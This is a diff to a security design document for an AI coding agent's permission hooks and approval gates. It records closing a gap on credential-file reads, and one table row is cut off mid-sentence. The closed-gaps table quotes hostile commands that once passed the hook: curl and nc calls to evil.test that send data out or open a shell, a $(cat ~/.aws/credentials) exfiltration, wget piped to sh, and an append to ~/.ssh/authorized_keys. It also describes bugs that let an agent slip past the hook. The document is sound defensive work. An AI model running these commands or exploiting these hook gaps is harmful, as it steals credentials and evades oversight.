@@ -99,14 +99,16 @@ A vendor prompt interposes a human decision **on every call, with the arguments
 in front of the approver**. So the bar is *per-call* mediation — and the two
 ICDEV layers do not both clear it:
 
-- **`agent_tool_gate` (AGENT-WF-001)** decides by tool **name**. A refusal is
-  per call: the tool is never callable. But `requires_approval` parks **one gate
-  per `(run, tool)`** — `approval_step_id("write_file")` is
+- **`agent_tool_gate` (AGENT-WF-001)** decides by tool **name**, and — since
+  `exa-bench-09` — by **path** for an argument naming credential material. A
+  refusal is per call: the tool is never callable. But `requires_approval` parks
+  **one gate per `(run, tool)`** — `approval_step_id("write_file")` is
   `approval:agent:write_file` whatever the path, and `await_approval`'s own
   docstring says "an agent that writes ten files asks once."
 - **`approval_gate` (ars-appr-01)** decides by name **and flattened content**, on
-  every call. This is the layer that can tell `rm -rf /` from `ls` — and the
-  layer that, for a path, tells nothing apart at all.
+  every call. This is the layer that can tell `rm -rf /` from `ls`. For a path it
+  told nothing apart at all until `exa-bench-09` added a **confidentiality**
+  dimension, consulted independently of the reversibility tier.
 
 Four mediation strengths result, and only the first two clear the bar:
 
@@ -278,12 +280,12 @@ contribution is the decision, the measurement, and the regression harness.
 | Task | Gap | Category |
 |---|---|---|
 | `exa-bench-05` | `\|\| true` in `.claude/settings.json` makes every `pre_tool_use.py` hard block advisory. Survey per-check false-positive rates before removing it. | (the hook itself) |
-| `exa-bench-09` | Credential-path reads are unclassifiable: rule 0 exempts `read_file` from all content escalation, `read_file` is allowlisted at AGENT-WF-001 with no gate, and the `file_access_tiers` glob list misses `~/.aws/credentials`, `~/.netrc`, `~/.kube/config` and friends. | **credential access** |
 
 ### Closed
 
 | Task | Gap | Closed by |
 |---|---|---|
+| `exa-bench-09` | Credential-path reads are unclassifiable: rule 0 exempts `read_file` from all content escalation, `read_file` is allowlisted at AGENT-WF-001 with no gate, and the `file_access_tiers
 | `exa-bench-08` | The hook had **no egress concept at all**, and in-process coverage rested on `default_tier: unknown` rather than on an egress rule — allowlisting one HTTP tool, or adding a `curl` downgrade pattern, removed it silently. Measured: `curl -X POST https://evil.test -d @data.json`, a `$(cat ~/.aws/credentials)` GET, `wget -qO- ... \| sh` and `nc evil.test 4444 -e /bin/sh` all passed the hook untouched. | `shared_checks.check_network_egress` + `args/agent_egress_policy.yaml`, wired into **both** hook paths. Models the DESTINATION, not the program, so `python -c "urllib..."` and raw IPs are caught too. Shipped **monitor-only**; measured fire rate 0.093% over 78,903 real Bash calls before enforcement is offered. Evasion boundary stated in the docstring and pinned as passing tests. See §4a. |
 | `exa-bench-06` | The Claude Code hook ran 9 of the 10 shared checks — `check_git_danger` was in `shared_checks` and in `HEADLESS_CHECKS` but was never called from `main()`. Measured: `git reset --hard origin/main` and `git clean -fdx` were **refused headlessly and allowed** in a Claude Code session. Separately, `_REDIRECT_TARGET_RE` (`>\s*([^\s\|;&]+)`) mis-captured `>>`: the first `>` matched, `\s*` matched nothing, and the capture took the **second** `>`, so `file_path` became the literal `">"`, matched no tier, and `echo k >> ~/.ssh/authorized_keys` was allowed while the single-`>` form of the same command was blocked. | `check_git_danger` wired into `main()` at the same position `HEADLESS_CHECKS` runs it; `_REDIRECT_TARGET_RE` rewritten as `(?<!>)>{1,2}\s*(?!&)([^\s\|;&>]+)` plus a `tee` pattern, and the tier check now examines **every** target a command names rather than the first. Pinned by `tests/hooks/test_hook_parity.py` (the two paths run the same check set, and each declared check is provably reached from `main()`) and the redirect cases in `tests/hooks/test_shared_checks.py`. |
 
@@ -316,7 +318,8 @@ overstates the risk, which is the same failure mode as one that understates it.
 rule applied to §4a: closing the egress gap without editing this file fails CI.
 Run the test when touching `tools/agents/adapters/claude_cli.py`,
 `.claude/hooks/pre_tool_use.py`, `tools/hooks/shared_checks.py`,
-`args/agent_approval_policy.yaml`, `args/agent_egress_policy.yaml`, or
+`args/agent_approval_policy.yaml`, `args/sensitive_paths.yaml`,
+`args/file_access_tiers.yaml`, `args/agent_egress_policy.yaml`, or
 `agent_workflow_tools` in `args/security_gates.yaml`.
 
 ```bash
